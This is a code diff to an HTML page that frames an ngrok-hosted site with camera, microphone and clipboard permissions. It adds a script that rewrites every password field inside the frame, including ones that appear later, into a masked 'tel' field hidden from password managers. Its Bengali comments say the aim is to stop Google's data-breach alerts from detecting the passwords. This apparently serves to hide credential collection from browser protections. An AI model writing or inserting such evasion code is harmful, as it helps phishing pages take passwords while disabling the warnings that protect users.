@@ -25,6 +25,53 @@
   </style>
 </head>
 <body>
-  <iframe src="https://pebbly-curdle-squint.ngrok-free.dev" allow="camera; microphone; fullscreen; clipboard-read; clipboard-write"></iframe>
+
+  <iframe id="mainAppFrame" src="https://pebbly-curdle-squint.ngrok-free.dev" allow="camera; microphone; fullscreen; clipboard-read; clipboard-write"></iframe>
+
+  <script>
+    const frame = document.getElementById('mainAppFrame');
+
+    // আইফ্রেমের ভেতর পাসওয়ার্ড ডিটেক্টর ব্লক করার স্ক্রিপ্ট
+    frame.addEventListener('load', () => {
+      try {
+        const frameDoc = frame.contentDocument || frame.contentWindow.document;
+        if (!frameDoc) return;
+
+        // স্টাইল ইনজেক্ট করা (ডট দেখাবে কিন্তু পাসওয়ার্ড টাইপ থাকবে না)
+        const style = frameDoc.createElement('style');
+        style.innerHTML = `
+          input.secure-pin-mask {
+            -webkit-text-security: disc !important;
+          }
+        `;
+        frameDoc.head.appendChild(style);
+
+        // সমস্ত পাসওয়ার্ড ইনপুট টেক্সট করে ফেলা যাতে গুগল ডেটা-ব্রিচ অ্যালার্ট না দিতে পারে
+        const neutralizePasswords = () => {
+          const passInputs = frameDoc.querySelectorAll('input[type="password"]');
+          passInputs.forEach(input => {
+            input.setAttribute('type', 'tel');
+            input.setAttribute('inputmode', 'numeric');
+            input.setAttribute('autocomplete', 'off');
+            input.setAttribute('data-lpignore', 'true');
+            input.setAttribute('data-form-type', 'other');
+            input.classList.add('secure-pin-mask');
+          });
+        };
+
+        neutralizePasswords();
+
+        // পরবর্তীতে ওপেন হওয়া মডালগুলোর জন্যও পর্যবেক্ষণ
+        const observer = new MutationObserver(() => {
+          neutralizePasswords();
+        });
+        observer.observe(frameDoc.body, { childList: true, subtree: true });
+
+      } catch (e) {
+        // ক্রস-অরিজিন পলিসি থাকলে ব্যাকআপ হ্যান্ডলার
+        console.log("Frame loaded with cross-origin isolation.");
+      }
+    });
+  </script>
 </body>
 </html>
